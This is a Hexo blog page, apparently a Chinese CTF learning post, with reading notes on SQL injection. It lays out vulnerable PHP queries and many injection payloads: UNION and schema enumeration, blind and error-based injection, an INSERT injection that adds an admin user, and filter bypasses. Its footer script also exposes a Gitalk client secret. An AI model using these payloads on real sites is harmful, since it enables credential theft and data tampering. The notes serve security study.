@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="xyy">
+
+
+
+
+
+<title>SQL注入 | xyy爱吃番茄（个人分享）</title>
+
+
+
+    <link rel="icon" href="https://qiniu.xuyuyan.cn/XYY.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">xyy爱吃番茄！(个人分享)</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于我</a>
+                
+                    <a class="menu-item" href="/friends">友链</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">xyy爱吃番茄！(个人分享)</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于我</a>
+                
+                    <a class="menu-item" href="/friends">友链</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">SQL注入</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">xyy</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 1, 2024&nbsp;&nbsp;18:57:22</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="SQL-注入-读书笔记"><a href="#SQL-注入-读书笔记" class="headerlink" title="SQL 注入 读书笔记"></a>SQL 注入 读书笔记</h1><blockquote>
+<p>来自于书《从0到1 CTFer的成长之路》Nu1L战队编著</p>
+</blockquote>
+<h3 id="0-查表"><a href="#0-查表" class="headerlink" title="0. 查表"></a>0. 查表</h3><table>
+<thead>
+<tr>
+<th>URL编码</th>
+<th>字符</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>%20</td>
+<td>空格</td>
+</tr>
+<tr>
+<td>%23</td>
+<td>#</td>
+</tr>
+<tr>
+<td>–%20</td>
+<td>–空格</td>
+</tr>
+<tr>
+<td>%27</td>
+<td>‘</td>
+</tr>
+</tbody></table>
+<h3 id="1-注入类型"><a href="#1-注入类型" class="headerlink" title="1. 注入类型"></a>1. 注入类型</h3><h4 id="1-1-数字型注入"><a href="#1-1-数字型注入" class="headerlink" title="1.1 数字型注入"></a>1.1 数字型注入</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query(<span class="variable">$conn</span>, <span class="string">&quot;SELECT title, content FROM wp_news WHERE id=&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>访问链接 <code>http://xxx.xxx.xxx.xxx/sql1.php?id=2</code></p>
+<p>【尝试1】访问 <code>http://xxx.xxx.xxx.xxx/sql1.php?id=3-1</code> 发现回显结果和之前一致，说明MySQL对 <code>3-1</code> 进行了计算</p>
+<p>得到结论 <code>数字型注入</code>，表现为输入点没有被引号包裹，具体见代码 <code>$_GET[&#39;id&#39;]</code></p>
+<p>【注入1】<code>http://xxx.xxx.xxx.xxx/sql1.php?id=1 union select user, pwd from wp_user</code></p>
+<p>假设我们不知道数据库的信息（如表名，字段名等）</p>
+<p>【注入2】<code>http://xxx.xxx.xxx.xxx/sql1.php?id=1 union select group_concat(table_name) from information_schema.tables where table_schema=database()</code></p>
+<ul>
+<li><code>table_name</code> 是 information_schema库tables表的表名字段</li>
+<li><code>table_schema</code> 是数据库名字段</li>
+<li><code>database()</code> 函数返回当前数据库名称</li>
+</ul>
+<p>【注入3】<code>http://xxx.xxx.xxx.xxx/sql1.php?id=1 union select group_concat(column_name) from information_schema.columns where table_schema=&#39;wp_user&#39;</code></p>
+<ul>
+<li>通过columns表及其columns_name字段，查询wp_user表的字段</li>
+</ul>
+<h4 id="1-2-字符型注入"><a href="#1-2-字符型注入" class="headerlink" title="1.2 字符型注入"></a>1.2 字符型注入</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query(<span class="variable">$conn</span>, <span class="string">&quot;SELECT title, content FROM wp_news WHERE id=&#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>【尝试1】访问 <code>http://xxx.xxx.xxx.xxx/sql1.php?id=3-1</code> 发现回显为空，说明<code>3-1</code> 没有被计算，不是数字型</p>
+<p>【尝试2】访问 <code>http://xxx.xxx.xxx.xxx/sql1.php?id=2a</code> 发现有回显</p>
+<ul>
+<li><code>1=&#39;1&#39;</code> 当数字和字符串数据比较，字符串被强转为数字</li>
+<li><code>1=&#39;1a&#39;</code> 字符串1a被强转为1</li>
+<li><code>&#39;a&#39;=0</code> 字符串a被强转为0  </li>
+</ul>
+<p>【尝试3】访问 <code>http://xxx.xxx.xxx.xxx/sql1.php?id=2&#39;#</code> ，即 <code>WHERE id=&#39;2&#39;#&#39;</code>，利用 <code>#</code> 注释后面的引号</p>
+<p>【尝试4】访问 <code>http://xxx.xxx.xxx.xxx/sql1.php?id=2&#39;union select concat(user,0x7e,pwd) from wp_user limit 1,1#</code>，即<code>WHERE id=&#39;2&#39;union select concat(user,0x7e,pwd) from wp_user limit 1,1#&#39;</code> </p>
+<p>【尝试5】访问<code>http://xxx.xxx.xxx.xxx/sql1.php?id=1&#39;and&#39;1</code>，即 <code>WHERE id=&#39;1&#39;and&#39;1&#39;</code>，后一个字符串’1’被强制转换成True</p>
+<ul>
+<li>【布尔盲注】可以利用在第二个’1’的位置，输入别的不确定表达式，通过回显情况，判断第二个表达式的真假</li>
+<li>一位一位打表探测</li>
+</ul>
+<p>【尝试6】访问<code>http://xxx.xxx.xxx.xxx/sql1.php?id=1&#39;or sleep(1)#</code>，即 <code>WHERE id=&#39;1&#39;or sleep(1)#&#39;</code></p>
+<ul>
+<li>如果执行SQL，可以明显关注到sleep的时间，而不是查询时延</li>
+<li>【时间盲注】利用IF条件函数、AND、OR的短路特性，和SQL的执行时间结果，来推断一些表达式是否为真</li>
+</ul>
+<h4 id="1-3-报错注入"><a href="#1-3-报错注入" class="headerlink" title="1.3 报错注入"></a>1.3 报错注入</h4><p>有时为了方便开发者调试，网站会开启错误调试信息，这种情况可以利用 <code>updatexml</code> 函数</p>
+<p>【尝试1】访问 <code>http://xxx.xxx.xxx.xxx/sql1.php?id=1&#39;or updatexml(1, concat(0x7e,(select pwd from wp_user)),1)#</code>，即<code>WHERE id=&#39;id=1&#39;or updatexml(1, concat(0x7e,(select pwd from wp_user)),1)#&#39;</code> </p>
+<ul>
+<li>updatexml函数要求第二个参数应为合法的XPATH路径，否则在报错的同时会将传入的参数进行输出</li>
+</ul>
+<h3 id="2-注入点"><a href="#2-注入点" class="headerlink" title="2. 注入点"></a>2. 注入点</h3><h4 id="2-1-SELECT-注入点在select-expr"><a href="#2-1-SELECT-注入点在select-expr" class="headerlink" title="2.1 SELECT 注入点在select_expr"></a>2.1 SELECT 注入点在select_expr</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query(<span class="variable">$conn</span>, <span class="string">&quot;SELECT <span class="subst">&#123;$_GET[&#x27;title&#x27;]&#125;</span>, content FROM wp_news&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>【尝试1】时间盲注</p>
+<p>【尝试2】AS别名，访问 <code>http://xxx.xxx.xxx.xxx/sql1.php?id=(select pwd from wp_user) as title</code>，即 <code>SELECT (select pwd from wp_user) as title, content FROM wp_news </code> </p>
+<h4 id="2-2-SELECT-注入点在table-reference"><a href="#2-2-SELECT-注入点在table-reference" class="headerlink" title="2.2 SELECT 注入点在table_reference"></a>2.2 SELECT 注入点在table_reference</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query(<span class="variable">$conn</span>, <span class="string">&quot;SELECT title FROM <span class="subst">&#123;$_GET[&#x27;title&#x27;]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>【尝试1】以别名的方法取出数据，访问 <code>http://xxx.xxx.xxx.xxx/sql1.php?id=(select pwd AS title FROM wp_user)x</code>，即 <code>SELECT title FROM (select pwd AS title FROM wp_user)x</code></p>
+<h4 id="2-3-SELECT-注入点在WHERE和HAVNG后"><a href="#2-3-SELECT-注入点在WHERE和HAVNG后" class="headerlink" title="2.3 SELECT 注入点在WHERE和HAVNG后"></a>2.3 SELECT 注入点在WHERE和HAVNG后</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query(<span class="variable">$conn</span>, <span class="string">&quot;SELECT title FROM wp_news WHERE id = <span class="subst">&#123;$_GET[&#x27;title&#x27;]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>先判断有无引号包裹，再闭合前面可能存在的引号</p>
+<h4 id="2-4-SELECT-注入点在GROUP-BY或ORDER-BY后"><a href="#2-4-SELECT-注入点在GROUP-BY或ORDER-BY后" class="headerlink" title="2.4 SELECT 注入点在GROUP BY或ORDER BY后"></a>2.4 SELECT 注入点在GROUP BY或ORDER BY后</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query(<span class="variable">$conn</span>, <span class="string">&quot;SELECT title FROM wp_news GROUP BY <span class="subst">&#123;$_GET[&#x27;title&#x27;]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>经过测试可以发现 title=id desc, (if(1, sleep(1), 1))会让页面延迟1秒</p>
+<p>访问 <code>http://xxx.xxx.xxx.xxx/sql1.php?title=id desc,(if(1,sleep(1),1))</code>，即 <code>SELECT title FROM wp_news GROUP BY id desc,(if(1,sleep(1),1))</code></p>
+<h4 id="2-5-SELECT-注入点在LIMIT后"><a href="#2-5-SELECT-注入点在LIMIT后" class="headerlink" title="2.5 SELECT 注入点在LIMIT后"></a>2.5 SELECT 注入点在LIMIT后</h4><p>不适用字符注入，LIMIT后只能是数字</p>
+<ul>
+<li>在语句没有ORDER BY时，可以使用UNION注入</li>
+<li>根据SELECT语法，使用PROCEDURE来尝试注入，只适合MySQL5.6前的版本</li>
+<li>基于时间注入</li>
+</ul>
+<h4 id="2-6-INSERT-table-name注入"><a href="#2-6-INSERT-table-name注入" class="headerlink" title="2.6 INSERT table_name注入"></a>2.6 INSERT table_name注入</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query(<span class="variable">$conn</span>, <span class="string">&quot;INSERT INTO <span class="subst">&#123;$_GET[&#x27;table&#x27;]&#125;</span> VALUES(2,2,2,2)&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>【尝试1】访问<code>http://xxx.xxx.xxx.xxx/sql1.php?table=wp_user values(2,&#39;newadmin&#39;,&#39;newpass&#39;)#</code>，即<code>INSERT INTO wp_user values(2,&#39;newadmin&#39;,&#39;newpass&#39;)# VALUES(2,2,2,2)</code></p>
+<h4 id="2-7-INSERT-VALUES注入"><a href="#2-7-INSERT-VALUES注入" class="headerlink" title="2.7 INSERT VALUES注入"></a>2.7 INSERT VALUES注入</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query(<span class="variable">$conn</span>, <span class="string">&quot;INSERT INTO wp_user VALUES(1, 1, &#x27;<span class="subst">&#123;$_GET[&#x27;value&#x27;]&#125;</span>&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>【尝试1】先闭合单引号，然后另插入一条记录</p>
+<p>访问 <code>http://xxx.xxx.xxx.xxx/sql1.php?value=1&#39;),(2,1,&#39;aaa&#39;)#</code></p>
+<p>即 <code>INSERT INTO wp_user VALUES(1, 1, &#39;1&#39;),(2,1,&#39;aaa&#39;)#&#39;)</code></p>
+<p>【尝试2】利用回显字段</p>
+<p>访问 <code>http://xxx.xxx.xxx.xxx/sql1.php?value=1&#39;),(2, 2, (SELCT pwd FROM wp_user LIMIT 1))#</code></p>
+<p>即 ``INSERT INTO wp_user VALUES(1, 1, ‘1’),(2, 2, (SELCT pwd FROM wp_user LIMIT 1))#’)`</p>
+<h3 id="3-注入和防御"><a href="#3-注入和防御" class="headerlink" title="3 注入和防御"></a>3 注入和防御</h3><h4 id="3-1-字符替换"><a href="#3-1-字符替换" class="headerlink" title="3.1 字符替换"></a>3.1 字符替换</h4><p>【防御1】只过滤了空格</p>
+<p>【绕过1】把空格替换成其他空白符 <code>%0a</code> <code>%0b</code> <code>%0c</code> <code>%0d</code> <code>%09</code> <code>%a0</code></p>
+<hr>
+<p>【防御2】将SELECT替换为空</p>
+<p>【绕过2】嵌套，<code>SELECSELECTT</code>，经过过滤后又成为了SELECT</p>
+<hr>
+<p>【防御3】大小写匹配，MySQL中关键字是不区分大小写</p>
+<p>【绕过3】大小写混写，sEleCT</p>
+<hr>
+<p>【防御4】正则匹配<code>\bselect\b</code></p>
+<p>【绕过4】/*!50000select*/</p>
+<hr>
+<p>【防御5】替换了但引号或双引号，但是忘记了反斜杠</p>
+<p>【绕过5】<code>SELECT * FROM wp_news WHERE id=&#39;可控1&#39; AND title=&#39;可控2&#39;</code>，构造绕过 <code>SELECT * FROM wp_news WHERE id=&#39;a\&#39; AND title = &#39;OR sleep(1)#&#39;</code> ，执行后发现控制点2已经逃逸引号，可以利用union注入获取更多敏感信息</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>xyy</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.xuyuyan.cn/2024/11/01/SQL%E6%B3%A8%E5%85%A5/">http://www.xuyuyan.cn/2024/11/01/SQL%E6%B3%A8%E5%85%A5/</a></span>
+                    </p>
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/"># SQL注入</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2022/10/18/bilibili%E6%97%A5%E5%B8%B8%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/">bilibili日常实习面试记录</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: '4283629b368b1cf98f81',
+        clientSecret: '8bb6ce27010c0db8286e943f3765aeae1757de4d',
+        repo: 'xyyBlog',
+        owner: 'rdzfv',
+        admin: 'rdzfv',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 10,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: true
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+
+
+        </div>
+        <footer id="footer" class="footer">
+   <div class="copyright">
+    <div style="position:fixed;left:8%;bottom:5%;">
+        <div id="webpushr-subscription-button" data-button-text="订阅本站" data-subscriber-count-text="人已订阅" data-background-color="#000000"></div>
+    </div>
+    <div style="display:inline-block;">
+        <div> <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/" style="text-decoration: none;color: black;" >浙ICP备19012712号</a> </div>
+        <span>© xyy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
